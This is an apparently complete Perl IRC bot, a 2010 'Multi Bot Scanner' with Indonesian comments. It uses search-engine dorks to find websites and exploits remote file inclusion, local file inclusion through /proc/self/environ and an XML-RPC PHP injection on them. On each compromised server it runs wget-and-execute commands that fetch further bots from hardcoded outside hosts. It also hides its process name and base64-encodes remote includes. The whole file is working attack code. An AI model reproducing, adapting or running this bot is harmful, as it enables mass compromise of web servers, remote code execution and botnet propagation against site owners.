#!/usr/bin/perl
# Multi Bot Scanner
# Powered @ 2010
#########################################################
$powered="Karaw4nghacK";
$mail="shepdoy(at)yahoo.com";
#########################################################
my $proses = "/usr/sbin/apache2 -k start"; 
#########################################################
my $server	= "200.75.12.211";
my $port	= "6667";
my $nick	= "R0b0Tz".(int(rand(99)));
my $chan	= "#fortuna";
my $admin	= "hostdevil";
############# Setting ID & Spread ##############
my $shell	= "http://www.miranda.gov.ve/modules/mod_sections/helper.gif????";
my $tombak	= "http://210.56.94.114/~adamwyd/contactpoint/cgi-bin/ID-RFI.txt??";	# 
my $lficek	= "../../../../../../../../../../../../../../../../proc/self/environ%00";
my $botphp	= "http://210.56.94.114/~adamwyd/contactpoint/cgi-bin/dwnld.jpg???";				# Spread bot php
my $botperl	= "http://210.56.94.114/~adamwyd/.smileys/kcb.txt??";					# Spread PerL
my $lfispread	= "wget http://210.56.94.114/~adamwyd/.smileys/kcb.txt??; perl pl.txt; rm -f pl.txt*";			# Spread LFI
my $xmlspread	= "cd /tmp; wget http://www.miranda.gov.ve/images/pl.txt; perl pl.txt; rm -f pl.txt*";	# Spread XML
######## Setting Perintah #######
my $rfi		="!rfi";
my $lfi		="!lfi";
my $cmdlfi	="!lfibro";
my $xml		="!xml";
my $cmdxml	="!xmlbro";
##################### Setting Selesai #####################
# Untuk sisanya tidak perlu dirubah kalo tidak mengerti
# karena mungkin akan menyebabkan bot tidak jalan
###########################################################
use HTTP::Request;
use HTTP::Request::Common;
use LWP::UserAgent;
use LWP::Simple;
use LWP 5.64;
use IO::Socket::INET;
use IO::Socket;
use IO::Select;
use Socket;
############################
&copyright();
my $pid=fork;
exit if $pid;
$0="$proses"."\0"x16;
my $pesan = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$port",Proto=>"tcp") or die "Server Bututttt!\n";
$pesan->autoflush(1);
print $pesan "NICK $nick\r\n";
print $pesan "USER wew 8 * : -xXx- Nuaing\r\n";
print $pesan "JOIN $chan\r\n";
while($perintah = <$pesan>){
$perintah =~ s/\r\n$//;
if ($perintah=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $pesan "PONG :$1";
}

### Commands ###
if ($perintah=~ /PRIVMSG $chan :!help/){
kirim($pesan, "PRIVMSG $chan :6 $rfi6 $lfi6 $xml3 [Perintah Bot!]");
kirim($pesan, "PRIVMSG $chan :6 !id3 [Cek ID RFI!]");
kirim($pesan, "PRIVMSG $chan :6 !pid3 [Melihat Pid Proses!]");
kirim($pesan, "PRIVMSG $chan :3 Multi Bot Scanner http://www.jatimcrew.org");
}

if ($perintah=~ /PRIVMSG $chan :!id/){
&cekid();
}

if ($perintah=~ /PRIVMSG $chan :!pid/){
kirim($pesan, "PRIVMSG $chan :6pid = $proses - $$");
}

### Cek ID ###
sub cekid() {
my $re = surfing($tombak);
if ($re =~ /shepdoy/) {
kirim($pesan, "PRIVMSG $chan :6 ID Mantabbs bro!!!");
} else {
kirim($pesan, "PRIVMSG $chan :4 ID Lemah syahwat cuy!!!");
}
}

###### perintah RFI ######
if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :6[bug]4 $rusak");
kirim($pesan, "PRIVMSG $chan :6[dork]4 $kunci");
kirim($pesan, "PRIVMSG $chan :3 tunggu agy di cek ngopi dolo aja cuyy...");
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$rfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&rfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

###### Perintah LFI ######
if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :6[bug]4 $rusak");
kirim($pesan, "PRIVMSG $chan :6[dork]4 $kunci");
kirim($pesan, "PRIVMSG $chan :3 tunggu agy di cek ngopi dolo aja cuyy...");
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$lfi\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&lfiscan($mesin,$rusak,$kunci);
}
exit;
}
}

##### Peintah XML ######
if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Google";
my $rusak = $1;
my $kunci = $2;
kirim($pesan, "PRIVMSG $chan :6[bug]4 $rusak");
kirim($pesan, "PRIVMSG $chan :6[dork]4 $kunci");
kirim($pesan, "PRIVMSG $chan :3 tunggu agy di cek ngopi dolo aja cuyy...");
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Alltheweb";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Naver";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Onet";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

if ($perintah=~ /PRIVMSG $chan :$xml\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {	exit; } else {
my $mesin = "Altavista";
my $rusak = $1;
my $kunci = $2;
&xmlscan($mesin,$rusak,$kunci);
}
exit;
}
}

#### Cek RFI ######
sub rfiscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
kirim($pesan, "PRIVMSG $chan :6-+RFI+- 12$mesin4 -+".scalar(@clean)."+-");
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
kirim($pesan, "PRIVMSG $chan :6-+RFI+- 12$mesin4 $kunci7 Selesai4! ");
}
my $cektarget 	= "http://".$target.$rusak.$tombak."?";
my $inject		= "http://".$target."12".$rusak."7".$shell."?";
my $re   = surfing($cektarget);
if($re =~ /shepdoy/){
os($cektarget);
kirim($pesan, "PRIVMSG $chan :6-+RFI+- 12$mesin6 $inject ");
kirim($pesan, "PRIVMSG $chan :6-+RFI+- 12$mesin3 $os ");
kirim($pesan, "PRIVMSG $admin :6-+RFI+- 12$mesin6 $inject 3 $os ");
### Spread RFI ###
my $rfiphp 	= "http://".$target.$rusak.$botphp."?";
my $re   = surfing($rfiphp);
my $rfiperl = "http://".$target.$rusak.$botperl."?";
my $re   = surfing($rfiperl);
### oFF ###
}
}
}

#### Cek LFI ######
sub lfiscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
kirim($pesan, "PRIVMSG $chan :6-+LFI+- 12$mesin4 -+".scalar(@clean)."+-");
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
kirim($pesan, "PRIVMSG $chan :6-+LFI+- 12$mesin4 $kunci7 Selesai4! ");
}
my $cektarget 	= "http://".$target.$rusak.$lficek;
my $inject 	= "http://".$target.$rusak.$lficek;
my $re   = surfing($cektarget);
if ($re  =~ /DOCUMENT_ROOT/){
if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
my $test = lfiquery($cektarget,"uname -a;echo KcB;id;$lfispread");
$test =~ s/\n//g;
if ($test =~ /KcB#(.*)KcBuid=(.*)#KcB/sg) {
my ($osx,$uid) = ($1,$2);
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin6 $inject ");
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin3 $osx ");
kirim($pesan, "PRIVMSG $admin :6-+XmL+- 12$mesin6 $inject 3 $osx ");				
} else {
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin4 http://$target ");
}
} exit } sleep(3);
}
}
}

sub lfiquery() {
my $url = $_[0];
my $rce = $_[1];
my $agent = "<?php echo \"KcB#\"; passthru(\'".$rce."\'); echo \"#KcB\"; ?>";
my $ua = LWP::UserAgent->new(agent => $agent);
$ua->timeout(7);
my $req = HTTP::Request->new(GET => $url);
my $response = $ua->request($req);
return $response->content;
}

#### Cek XmL ######
sub xmlscan() {
my $mesin = $_[0];
my $rusak = $_[1];
my $kunci = $_[2];
my $contatore = 0;
if ($mesin =~ /Google/) {
my @google=&google($kunci);
push(@total, @google);
}
if ($mesin =~ /Alltheweb/) {
my @alltheweb=&alltheweb($kunci);
push(@total, @alltheweb);
}
if ($mesin =~ /Naver/) {
my @Naver=&naver($kunci);
push(@total, @Naver);
}
if ($mesin =~ /Onet/) {
my @Onet=&onet($kunci);
push(@total, @Onet);
}
if ($mesin =~ /Altavista/) {
my @Altavista=&altavista($kunci);
push(@total, @Altavista);
}
my @clean=&hitung(@total);
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin4 -+".scalar(@clean)."+-");
if (scalar(@clean) != 0) {
}
my $uni=scalar(@clean);
foreach my $target (@clean)
{
$contatore++;
if ($contatore==$uni-1){
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin4 $kunci7 Selesai4! ");
}
my $cektarget 	= "http://".$target.$rusak;
my $re   = surfing($cektarget);
if($re =~ /faultCode/){
xmlcek($cektarget);
xmlvuln($cektarget);
xmlxspread($cektarget,$xmlspread);
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin6 $shellx ");
kirim($pesan, "PRIVMSG $chan :6-+XmL+- 12$mesin3 $os ");
kirim($pesan, "PRIVMSG $admin :6-+XmL+- 12$mesin6 $shellx 3 $os ");
}
}
}
my $cmd = "echo(base64_decode(\"Vm9v\").php_uname().base64_decode(\"RG9v\"));include(base64_decode(\"aHR0cDovLzIxMC41Ni45NC4xMTQvfmFkYW13eWQvY29udGFjdHBvaW50L2NnaS1iaW4vZHdubGQu
anBn\"));include(base64_decode(\"aHR0cDovLzIxMC41Ni45NC4xMTQvfmFkYW13eWQvY29udGFjdHBvaW50L2NnaS1iaW4vSUQtUkZJ
LnR4dA==\"));";
sub xmlcek() {
my $colok = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'KcB';echo`uname -a`;echo'KcB';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /KcB(.*)KcB/s) {
$os=$1;
}}

sub xmlvuln() {
my $colok = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'Bitch'.'X';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /BitchX/) {
$shellx=$colok;
}}

sub xmlxspread() {
my $colok = $_[0];
my $cucuk = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'shep';echo`".$cucuk."`;echo'doy';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $colok, Content_Type => 'text/xml', Content => $exploit);
}}

#######
# Sub Surfing
##################
sub surfing() {
    $url    = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}

#######
## Sub Kirim
##############
sub kirim(){
if ($#_ == '1') {
my $pesan = $_[0];
print $pesan "$_[1]\n";
} else {
print $pesan "$_[0]\n";
}}

#####
# Sub OS
#########
sub os() {
    my $target=$_[0];
    my $re  = &query($target);
    while ($re =~ m/<br>OSTYPE:(.+?)\<br>/g) {
        $os = $1;
    }
}

#########
# Sub Engine
###############
sub google(){
    my @lst;
    my $key = $_[0];
    for ($b=0;$b<=1000;$b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub naver() {
    my @lst;
    my $key = $_[0];
    for ( $b=1;$b<=1000;$b+=10){
        my $naver = ( "http://web.search.naver.com/search.naver?where=webkr&query=".key($key)."&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=".$b);
        my $Res = query($naver);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
            my $k = $1;
            if ($k!~/busca|uol|yahoo/) {
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep);
            }
        }
    }
 return @lst;
}

sub onet(){
	my @lst;
	my $key = $_[0];
	for($b=0;$b<=50;$b+=1){#20
		my $Lyc=("http://szukaj.onet.pl/query.html?qt=".key($key)."&p=".$b);
		my $Res=query($Lyc);
		while($Res =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g){
			my $k=$1;
			my @grep=links($k);
				push(@lst,@grep);
			}
		}
	return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://nl.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub links(){
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub copyright() {
if (($powered !~ /4/)||($mail !~ /pd/)) {
print "\nDasar Doyok!!! Bodoh ToloL Oon Doyok!!! Udah Gak Usah diRubah Lagi!!! \nby shepdoy// KarawanghacK\n\n"; 
exec("rm -rf $0 && pkill perl");
}
}

sub query($) {
my $url = $_[0];
$url =~ s/http:\/\///;
my $host  = $url;
my $query = $url;
my $page  = "";
$host  =~ s/href=\"?http:\/\///;
$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~ s/$host//;
if ( $query eq "" ) { $query = "/"; }
eval {
my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page = "@r";
close($sock);
};
return $page;
}

sub hitung {
	my @calculate = ();
	my %visti = ();
	foreach my $element (@_) {
		$element =~ s/\/+/\//g;
		next if $visti{$element}++;
		push @calculate, $element;
	}
	return @calculate;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

### EOF ##